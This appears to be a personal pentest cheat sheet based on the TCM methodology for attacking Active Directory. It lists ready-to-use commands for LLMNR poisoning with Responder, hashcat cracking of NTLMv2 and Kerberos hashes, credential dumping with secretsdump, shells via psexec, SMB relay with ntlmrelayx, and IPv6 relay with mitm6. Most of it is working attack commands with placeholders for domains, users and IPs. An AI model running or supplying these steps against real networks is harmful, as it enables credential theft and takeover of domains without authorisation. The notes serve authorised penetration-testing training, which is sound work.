################################
TCM Methodology to Pentest AD
################################

-Initial AD Attack Vector:
    We have 1 Machine, what could we Do:

        -LLMNR Poisoning Attack 
            <-- Identify Host when DNS fails to do
            <-- Get NTLMv2 Hash, when responder receive datas NOT PTH Attack with NTLMv2
                We can crack the passwrd via Hashcat
            
            Hashcat wich mode:
                hashcat --help | grep NTLMv2
                hashcat -m 5600 llmnr.txt rockyou.txt

            Dump Creds:
                https://medium.com/@benichmt1/secretsdump-demystified-bfd0f933dd9b
                secretsdump.py <DOMAIN>.local/<UserName>:'<Passwd>'@<IP
                secretsdump.py <UserName>:<IP> -hashes <LM HASH>

            GET a Shell:
                psexec.py <DOMAIN>.local/<UserName>:'<Passwd>'@<IP>



        -SMB Relay  get NTLM HASH to Perform "PTH Attack":
            <-- Relay the hashes to a specific machines and gain access
            <-- "SMB SIGNING" must be DISABLED OR NOT ENFORCED
            <-- Relayed creds must be ADMIN on machine

            Identify if NOT ENFORCED or DISABLED:
                nmap --script=smb2-security-mode.nse -p445 <IP>:
                    "Message signing enabled but not required" <-- == GOOD

            SMB Relay config in Kali:
                sudo nano /etc/responder/Responder.conf
                    ->SMB and HTTP == Off

            Start Responder:
                sudo responder -i <interfaceName> -dwP

            Setup the relay:
                sudo ntlmrelayx.py -tf targets.txt -smb2support

            We use the 3rd part of the Hash:
                :<NTLM HASHE EXA>:::


            Connect with PTH:
                https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/lateral-movement/alternate-authentication-material/wip-pass-the-hash

        

        -IPV6 Attack:
            1: sudo ntlmrelayx.py -6 -t ldaps://<IP> -wh <Username><DomaineName><local> -l lootme


            2: run mitm6 (no more than 5-10 minutes at a time):
                sudo mitm6 -d <DomaineName>.<Local>
          
            hashcat -m 13100 kerberoast.txt rockyou.txt

            3: Check the event often "NON ADMIN EVENTS OCCURES" reboot, login etc..

            4: Go to "lootme" file and check infos


        -ASREP Rasting:
            Attack is possible when Kerberos Pre-Auth is NOT REQUIRED
            Use if we needs to Auth to an app, but the app DOES NOT accept/support KERBEROS PRE-Auth